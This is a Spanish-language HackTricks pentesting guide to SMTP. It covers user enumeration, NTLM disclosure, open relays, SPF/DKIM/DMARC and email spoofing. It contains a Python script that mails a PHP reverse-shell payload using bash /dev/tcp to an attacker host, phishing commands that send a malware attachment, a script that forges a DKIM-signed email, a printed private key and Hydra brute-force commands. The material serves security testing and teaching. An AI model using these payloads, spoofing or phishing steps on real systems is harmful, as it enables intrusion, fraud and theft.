# 25,465,587 - Pentesting SMTP/s

{{#include ../../banners/hacktricks-training.md}}

## **Información Básica**

El **Protocolo Simple de Transferencia de Correo (SMTP)** es un protocolo utilizado dentro de la suite TCP/IP para el **envío y recepción de correos electrónicos**. Debido a sus limitaciones en la cola de mensajes en el extremo del destinatario, SMTP se emplea a menudo junto con **POP3 o IMAP**. Estos protocolos adicionales permiten a los usuarios almacenar mensajes en un buzón de servidor y descargarlos periódicamente.

En la práctica, es común que los **programas de correo electrónico** utilicen **SMTP para enviar correos electrónicos**, mientras que utilizan **POP3 o IMAP para recibirlos**. En sistemas basados en Unix, **sendmail** se destaca como el servidor SMTP más utilizado para fines de correo electrónico. El paquete comercial conocido como Sendmail abarca un servidor POP3. Además, **Microsoft Exchange** proporciona un servidor SMTP y ofrece la opción de incluir soporte para POP3.

**Puerto por defecto:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### EMAIL Headers

Si tienes la oportunidad de **hacer que la víctima te envíe un correo electrónico** (a través del formulario de contacto de la página web, por ejemplo), hazlo porque **podrías aprender sobre la topología interna** de la víctima viendo los encabezados del correo.

También puedes obtener un correo electrónico de un servidor SMTP intentando **enviar a ese servidor un correo a una dirección no existente** (porque el servidor enviará al atacante un correo NDN). Pero, asegúrate de que envías el correo desde una dirección permitida (verifica la política SPF) y que puedes recibir mensajes NDN.

También deberías intentar **enviar diferentes contenidos porque puedes encontrar información más interesante** en los encabezados como: `X-Virus-Scanned: by av.domain.com`\
Deberías enviar el archivo de prueba EICAR.\
Detectar el **AV** puede permitirte explotar **vulnerabilidades conocidas.**

## Basic actions

### **Banner Grabbing/Basic connection**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### Encontrar servidores MX de una organización
```bash
dig +short mx google.com
```
### Enumeración
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - Divulgación de información

Si el servidor admite autenticación NTLM (Windows), puedes obtener información sensible (versiones). Más información [**aquí**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
O **automatiza** esto con el **plugin** de **nmap** `smtp-ntlm-info.nse`

### Nombre del servidor interno - Divulgación de información

Algunos servidores SMTP completan automáticamente la dirección de un remitente cuando se emite el comando "MAIL FROM" sin una dirección completa, revelando su nombre interno:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Sniffing

Verifica si puedes capturar alguna contraseña de los paquetes al puerto 25

### [Auth bruteforce](../../generic-hacking/brute-force.md#smtp)

## Enumeración de Bruteforce de Nombre de Usuario

**La autenticación no siempre es necesaria**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### Herramientas automáticas
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
## Informes DSN

**Informes de Notificación de Estado de Entrega**: Si envías un **correo electrónico** a una organización a una **dirección inválida**, la organización te notificará que la dirección era inválida enviando un **correo de vuelta a ti**. Los **encabezados** del correo electrónico devuelto **contendrán** posible **información sensible** (como la dirección IP de los servicios de correo que interactuaron con los informes o información del software antivirus).

## [Comandos](smtp-commands.md)

### Enviando un Correo Electrónico desde la consola de linux
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Enviando un correo electrónico con Python

<details>

<summary>Código de Python aquí</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP Smuggling

La vulnerabilidad de SMTP Smuggling permitió eludir todas las protecciones de SMTP (consulta la siguiente sección para más información sobre las protecciones). Para más información sobre SMTP Smuggling consulta:

{{#ref}}
smtp-smuggling.md
{{#endref}}

## Contramedidas de Suplantación de Correo

Las organizaciones se ven impedidas de tener correos electrónicos no autorizados enviados en su nombre al emplear **SPF**, **DKIM** y **DMARC** debido a la facilidad de suplantar mensajes SMTP.

Una **guía completa sobre estas contramedidas** está disponible en [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/).

### SPF

> [!CAUTION]
> SPF [fue "deprecado" en 2014](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). Esto significa que en lugar de crear un **registro TXT** en `_spf.domain.com`, lo creas en `domain.com` utilizando la **misma sintaxis**.\
> Además, para reutilizar registros SPF anteriores, es bastante común encontrar algo como `"v=spf1 include:_spf.google.com ~all"`

**Sender Policy Framework** (SPF) es un mecanismo que permite a los Agentes de Transferencia de Correo (MTAs) verificar si un host que envía un correo electrónico está autorizado consultando una lista de servidores de correo autorizados definidos por las organizaciones. Esta lista, que especifica direcciones/rangos IP, dominios y otras entidades **autorizadas para enviar correos electrónicos en nombre de un nombre de dominio**, incluye varios "**Mecanismos**" en el registro SPF.

#### Mecanismos

De [Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework):

| Mecanismo | Descripción                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | Coincide siempre; se utiliza para un resultado predeterminado como `-all` para todas las IPs no coincidentes con mecanismos anteriores.                                                                                                                                                                                            |
| A         | Si el nombre de dominio tiene un registro de dirección (A o AAAA) que puede resolverse a la dirección del remitente, coincidirá.                                                                                                                                                                                                   |
| IP4       | Si el remitente está en un rango de direcciones IPv4 dado, coincide.                                                                                                                                                                                                                                                               |
| IP6       | Si el remitente está en un rango de direcciones IPv6 dado, coincide.                                                                                                                                                                                                                                                               |
| MX        | Si el nombre de dominio tiene un registro MX que resuelve a la dirección del remitente, coincidirá (es decir, el correo proviene de uno de los servidores de correo entrante del dominio).                                                                                                                                         |
| PTR       | Si el nombre de dominio (registro PTR) para la dirección del cliente está en el dominio dado y ese nombre de dominio se resuelve a la dirección del cliente (DNS inverso confirmado por adelantado), coincide. Este mecanismo se desaconseja y debe evitarse, si es posible.                                                  |
| EXISTS    | Si el nombre de dominio dado se resuelve a cualquier dirección, coincide (sin importar la dirección a la que se resuelva). Esto se usa raramente. Junto con el lenguaje de macros SPF, ofrece coincidencias más complejas como consultas DNSBL.                                                                                 |
| INCLUDE   | Hace referencia a la política de otro dominio. Si la política de ese dominio pasa, este mecanismo pasa. Sin embargo, si la política incluida falla, el procesamiento continúa. Para delegar completamente a la política de otro dominio, se debe usar la extensión de redirección.                                               |
| REDIRECT  | <p>Una redirección es un puntero a otro nombre de dominio que alberga una política SPF, permite que múltiples dominios compartan la misma política SPF. Es útil cuando se trabaja con una gran cantidad de dominios que comparten la misma infraestructura de correo electrónico.</p><p>Se utilizará la política SPF del dominio indicado en el mecanismo de redirección.</p> |

También es posible identificar **Calificadores** que indican **qué se debe hacer si se coincide con un mecanismo**. Por defecto, se utiliza el **calificador "+"** (por lo que si se coincide con algún mecanismo, eso significa que está permitido).\
Normalmente notarás **al final de cada política SPF** algo como: **\~all** o **-all**. Esto se utiliza para indicar que **si el remitente no coincide con ninguna política SPF, debes etiquetar el correo electrónico como no confiable (\~) o rechazar (-) el correo electrónico.**

#### Calificadores

Cada mecanismo dentro de la política puede ser precedido por uno de cuatro calificadores para definir el resultado previsto:

- **`+`**: Corresponde a un resultado de PASS. Por defecto, los mecanismos asumen este calificador, haciendo que `+mx` sea equivalente a `mx`.
- **`?`**: Representa un resultado NEUTRAL, tratado de manera similar a NONE (sin política específica).
- **`~`**: Denota SOFTFAIL, sirviendo como un término medio entre NEUTRAL y FAIL. Los correos electrónicos que cumplen con este resultado son típicamente aceptados pero marcados en consecuencia.
- **`-`**: Indica FAIL, sugiriendo que el correo electrónico debe ser rechazado de inmediato.

En el próximo ejemplo, se ilustra la **política SPF de google.com**. Nota la inclusión de políticas SPF de diferentes dominios dentro de la primera política SPF:
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
Tradicionalmente, era posible falsificar cualquier nombre de dominio que no tuviera un registro SPF correcto o ninguno. **Hoy en día**, si el **correo electrónico** proviene de un **dominio sin un registro SPF válido**, probablemente será **rechazado/marcado como no confiable automáticamente**.

Para verificar el SPF de un dominio, puedes usar herramientas en línea como: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIM se utiliza para firmar correos electrónicos salientes, permitiendo su validación por agentes de transferencia de correo (MTAs) externos a través de la recuperación de la clave pública del dominio desde DNS. Esta clave pública se encuentra en el registro TXT de un dominio. Para acceder a esta clave, se debe conocer tanto el selector como el nombre del dominio.

Por ejemplo, para solicitar la clave, el nombre del dominio y el selector son esenciales. Estos se pueden encontrar en el encabezado del correo `DKIM-Signature`, p. ej., `d=gmail.com;s=20120113`.

Un comando para obtener esta información podría verse así:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (Autenticación, Informes y Conformidad Basada en Dominio)

DMARC mejora la seguridad del correo electrónico al basarse en los protocolos SPF y DKIM. Establece políticas que guían a los servidores de correo en el manejo de correos electrónicos de un dominio específico, incluyendo cómo tratar los fallos de autenticación y dónde enviar informes sobre las acciones de procesamiento de correos electrónicos.

**Para obtener el registro DMARC, necesitas consultar el subdominio \_dmarc**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### Etiquetas DMARC

| Nombre de etiqueta | Propósito                                      | Ejemplo                          |
| ------------------ | ---------------------------------------------- | -------------------------------- |
| v                  | Versión del protocolo                          | v=DMARC1                        |
| pct                | Porcentaje de mensajes sujetos a filtrado     | pct=20                          |
| ruf                | URI de informes para informes forenses        | ruf=mailto:authfail@example.com |
| rua                | URI de informes de informes agregados         | rua=mailto:aggrep@example.com   |
| p                  | Política para el dominio organizacional       | p=quarantine                    |
| sp                 | Política para subdominios del OD              | sp=reject                       |
| adkim              | Modo de alineación para DKIM                   | adkim=s                         |
| aspf               | Modo de alineación para SPF                    | aspf=r                          |

### **¿Qué pasa con los Subdominios?**

**Desde** [**aquí**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
Necesitas tener registros SPF separados para cada subdominio desde el cual desees enviar correo.\
Lo siguiente fue publicado originalmente en openspf.org, que solía ser un gran recurso para este tipo de cosas.

> La Pregunta Demoníaca: ¿Qué pasa con los subdominios?
>
> Si recibo correo de pielovers.demon.co.uk, y no hay datos SPF para pielovers, ¿debería retroceder un nivel y probar SPF para demon.co.uk? No. Cada subdominio en Demon es un cliente diferente, y cada cliente podría tener su propia política. No tendría sentido que la política de Demon se aplicara a todos sus clientes por defecto; si Demon quiere hacer eso, puede configurar registros SPF para cada subdominio.
>
> Así que el consejo para los editores de SPF es este: deberías agregar un registro SPF para cada subdominio o nombre de host que tenga un registro A o MX.
>
> Los sitios con registros A o MX comodín también deberían tener un registro SPF comodín, de la forma: \* IN TXT "v=spf1 -all"

Esto tiene sentido: un subdominio puede estar en una ubicación geográfica diferente y tener una definición SPF muy diferente.

### **Relay Abierto**

Cuando se envían correos electrónicos, asegurar que no sean marcados como spam es crucial. Esto se logra a menudo mediante el uso de un **servidor de relay que es confiable para el destinatario**. Sin embargo, un desafío común es que los administradores pueden no estar completamente conscientes de qué **rangos de IP son seguros para permitir**. Esta falta de comprensión puede llevar a errores en la configuración del servidor SMTP, un riesgo que se identifica con frecuencia en las evaluaciones de seguridad.

Una solución alternativa que algunos administradores utilizan para evitar problemas de entrega de correo, especialmente en lo que respecta a las comunicaciones con clientes potenciales o en curso, es **permitir conexiones desde cualquier dirección IP**. Esto se hace configurando el parámetro `mynetworks` del servidor SMTP para aceptar todas las direcciones IP, como se muestra a continuación:
```bash
mynetworks = 0.0.0.0/0
```
Para verificar si un servidor de correo es un relay abierto (lo que significa que podría reenviar correos electrónicos de cualquier fuente externa), se utiliza comúnmente la herramienta `nmap`. Incluye un script específico diseñado para probar esto. El comando para realizar un escaneo detallado en un servidor (por ejemplo, con IP 10.10.10.10) en el puerto 25 usando `nmap` es:
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **Herramientas**

- [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **Verificar configuraciones incorrectas de SPF y DMARC**
- [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **Obtener automáticamente configuraciones de SPF y DMARC**

### Enviar correo electrónico falso

- [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
- [**http://www.anonymailer.net/**](http://www.anonymailer.net)
- [**https://emkei.cz/**](https://emkei.cz/)

**O podrías usar una herramienta:**

- [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
> [!WARNING]
> Si obtienes algún **error al usar la biblioteca dkim de python** al analizar la clave, siéntete libre de usar la siguiente.\
> **NOTA**: Esta es solo una solución rápida para hacer verificaciones rápidas en casos donde por alguna razón la clave privada de openssl **no puede ser analizada por dkim**.
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
> spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
> pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
> AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
> koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
> fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
> 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
> ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
> GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
> 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
> Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
> zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
> K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
> -----END RSA PRIVATE KEY-----
> ```

**O podrías hacerlo manualmente:**

{{#tabs}}
{{#tab name="PHP"}}

<pre class="language-php"><code class="lang-php"><strong># Esto enviará un mensaje sin firmar
</strong><strong>mail("your_email@gmail.com", "¡Asunto de prueba!", "¡hey! Esto es una prueba", "From: administrator@victim.com");
</strong></code></pre>

{{#endtab}}

{{#tab name="Python"}}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{{#endtab}}
{{#endtabs}}

### **Más información**

**Encuentra más información sobre estas protecciones en** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **Otros indicadores de phishing**

- Edad del dominio
- Enlaces que apuntan a direcciones IP
- Técnicas de manipulación de enlaces
- Archivos adjuntos sospechosos (poco comunes)
- Contenido de correo electrónico roto
- Valores utilizados que son diferentes a los de los encabezados del correo
- Existencia de un certificado SSL válido y de confianza
- Envío de la página a sitios de filtrado de contenido web

## Exfiltración a través de SMTP

**Si puedes enviar datos a través de SMTP** [**lee esto**](../../generic-hacking/exfiltration.md#smtp)**.**

## Archivo de configuración

### Postfix

Por lo general, si está instalado, en `/etc/postfix/master.cf` contiene **scripts para ejecutar** cuando, por ejemplo, se recibe un nuevo correo por un usuario. Por ejemplo, la línea `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` significa que `/etc/postfix/filtering` se ejecutará si se recibe un nuevo correo por el usuario mark.

Otros archivos de configuración:
```
sendmail.cf
submit.cf
```
## Referencias

- [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
- [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)

## Comandos Automáticos de HackTricks
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
